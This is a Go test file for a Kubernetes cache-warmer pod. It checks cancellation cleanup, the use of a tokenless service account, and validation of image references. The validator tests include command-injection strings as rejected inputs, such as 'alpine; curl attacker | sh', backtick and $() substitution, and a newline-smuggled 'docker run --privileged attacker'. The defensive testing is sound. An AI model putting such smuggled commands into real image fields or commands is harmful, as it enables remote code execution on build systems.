package pool

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"log"
	"os"
	"slices"
	"strings"
	"testing"
	"time"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/kubernetes/fake"
	ktesting "k8s.io/client-go/testing"
)

func TestWarmPVCCancellationStopsAndDeletesTheWarmer(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	client := fake.NewSimpleClientset()
	client.PrependReactor("create", "pods", func(ktesting.Action) (bool, runtime.Object, error) {
		cancel()
		return false, nil, nil
	})

	result := make(chan error, 1)
	finished := make(chan struct{})
	go func() {
		defer close(finished)
		result <- WarmPVC(ctx, client, "builds", "sparkwing-cache-pool-1", "", nil)
	}()
	t.Cleanup(func() {
		cancel()
		timer := time.NewTimer(time.Second)
		defer timer.Stop()
		select {
		case <-finished:
		case <-timer.C:
			t.Error("WarmPVC did not stop during cleanup")
		}
	})

	timer := time.NewTimer(250 * time.Millisecond)
	defer timer.Stop()
	select {
	case err := <-result:
		if !errors.Is(err, context.Canceled) {
			t.Fatalf("WarmPVC error = %v, want context.Canceled", err)
		}
	case <-timer.C:
		t.Fatal("WarmPVC did not stop after context cancellation")
	}

	pods, err := client.CoreV1().Pods("builds").List(context.Background(), metav1.ListOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(pods.Items) != 0 {
		t.Fatalf("warmer pods after cancellation = %d, want 0", len(pods.Items))
	}
}

func TestWarmPVCRunsUnderAnUnprivilegedServiceAccountWithNoToken(t *testing.T) {
	tests := []struct {
		name           string
		serviceAccount string
		want           string
	}{
		{name: "empty falls back to the default", serviceAccount: "", want: WarmerServiceAccountName},
		{name: "release-scoped name is honored", serviceAccount: "other-cache-warmer", want: "other-cache-warmer"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()

			client := fake.NewSimpleClientset()
			created := make(chan *corev1.Pod, 1)
			client.PrependReactor("create", "pods", func(action ktesting.Action) (bool, runtime.Object, error) {
				created <- action.(ktesting.CreateAction).GetObject().(*corev1.Pod)
				cancel()
				return false, nil, nil
			})

			done := make(chan struct{})
			go func() {
				defer close(done)
				_ = WarmPVC(ctx, client, "builds", "sparkwing-cache-pool-1", tt.serviceAccount, nil)
			}()
			t.Cleanup(func() {
				cancel()
				<-done
			})

			timer := time.NewTimer(time.Second)
			defer timer.Stop()
			select {
			case pod := <-created:
				if pod.Spec.ServiceAccountName != tt.want {
					t.Errorf("warmer service account = %q, want %q", pod.Spec.ServiceAccountName, tt.want)
				}
				if pod.Spec.AutomountServiceAccountToken == nil || *pod.Spec.AutomountServiceAccountToken {
					t.Errorf("automountServiceAccountToken = %v, want false", pod.Spec.AutomountServiceAccountToken)
				}
			case <-timer.C:
				t.Fatal("WarmPVC never created a warmer pod")
			}
		})
	}
}

func TestAcceptedWarmImagesKeepsOnlyImageReferences(t *testing.T) {
	tests := []struct {
		name  string
		image string
		want  bool
	}{
		{name: "bare name", image: "alpine", want: true},
		{name: "tagged", image: "docker.io/library/golang:1.25-alpine", want: true},
		{name: "registry with port", image: "registry.example.com:5000/team/builder:v1.2.3", want: true},
		{name: "digest", image: "docker.io/library/alpine@sha256:" + strings.Repeat("a", 64), want: true},
		{name: "tag and digest", image: "alpine:3.21@sha256:" + strings.Repeat("0", 64), want: true},
		{name: "localhost registry", image: "localhost:5000/img", want: true},
		{name: "separators in path", image: "docker.io/my-org/my_app.v2:latest", want: true},
		{name: "command chain", image: "alpine; curl attacker | sh", want: false},
		{name: "command substitution", image: "alpine$(curl attacker)", want: false},
		{name: "backtick", image: "alpine`curl attacker`", want: false},
		{name: "newline", image: "alpine\ndocker run --privileged attacker", want: false},
		{name: "trailing newline", image: "alpine\n", want: false},
		{name: "quote break", image: "alpine' ; sh -c 'id", want: false},
		{name: "leading dash reads as a flag", image: "--config=/tmp/evil", want: false},
		{name: "empty", image: "", want: false},
		{name: "uppercase path", image: "Alpine", want: false},
		{name: "unsupported digest algorithm", image: "alpine@md5:abc", want: false},
		{name: "short digest", image: "alpine@sha256:abc", want: false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := acceptedWarmImages([]string{tt.image})
			if tt.want && (len(got) != 1 || got[0] != tt.image) {
				t.Fatalf("acceptedWarmImages(%q) = %q, want it accepted", tt.image, got)
			}
			if !tt.want && len(got) != 0 {
				t.Fatalf("acceptedWarmImages(%q) = %q, want it rejected", tt.image, got)
			}
		})
	}
}

func TestAcceptedWarmImagesReportsEachRejection(t *testing.T) {
	var logged bytes.Buffer
	log.SetOutput(&logged)
	t.Cleanup(func() { log.SetOutput(os.Stderr) })

	got := acceptedWarmImages([]string{"alpine:3.21", "alpine; curl attacker | sh"})

	if len(got) != 1 || got[0] != "alpine:3.21" {
		t.Fatalf("accepted images = %q, want only the valid entry", got)
	}
	if !strings.Contains(logged.String(), "alpine; curl attacker | sh") {
		t.Fatalf("rejection log = %q, want it to name the rejected entry", logged.String())
	}
}

func TestWarmPVCKeepsHostileWarmImagesOutOfThePodSpec(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	log.SetOutput(io.Discard)
	t.Cleanup(func() { log.SetOutput(os.Stderr) })

	client := fake.NewSimpleClientset()
	created := make(chan *corev1.Pod, 1)
	client.PrependReactor("create", "pods", func(action ktesting.Action) (bool, runtime.Object, error) {
		created <- action.(ktesting.CreateAction).GetObject().(*corev1.Pod)
		cancel()
		return false, nil, nil
	})

	warmImages := []string{
		"alpine; curl attacker | sh",
		"docker.io/library/alpine:3.21",
		"alpine`curl attacker`",
		"registry.example.com:5000/team/builder@sha256:" + strings.Repeat("b", 64),
		"alpine\ndocker run --privileged attacker",
	}
	wantArgs := []string{
		"docker.io/library/alpine:3.21",
		"registry.example.com:5000/team/builder@sha256:" + strings.Repeat("b", 64),
	}

	done := make(chan struct{})
	go func() {
		defer close(done)
		_ = WarmPVC(ctx, client, "builds", "sparkwing-cache-pool-1", "", warmImages)
	}()
	t.Cleanup(func() {
		cancel()
		<-done
	})

	timer := time.NewTimer(time.Second)
	defer timer.Stop()
	var pod *corev1.Pod
	select {
	case pod = <-created:
	case <-timer.C:
		t.Fatal("WarmPVC never created a warmer pod")
	}

	container := pod.Spec.Containers[0]
	if !slices.Equal(container.Args, wantArgs) {
		t.Fatalf("warmer args = %q, want %q", container.Args, wantArgs)
	}
	for _, arg := range container.Command {
		if slices.Contains(wantArgs, arg) {
			t.Fatalf("warmer command %q carries an image; images belong in args", container.Command)
		}
	}
	rendered, err := json.Marshal(pod)
	if err != nil {
		t.Fatal(err)
	}
	for _, hostile := range []string{"curl attacker", "docker run --privileged attacker"} {
		if strings.Contains(string(rendered), hostile) {
			t.Fatalf("pod spec contains rejected input %q:\n%s", hostile, rendered)
		}
	}
}
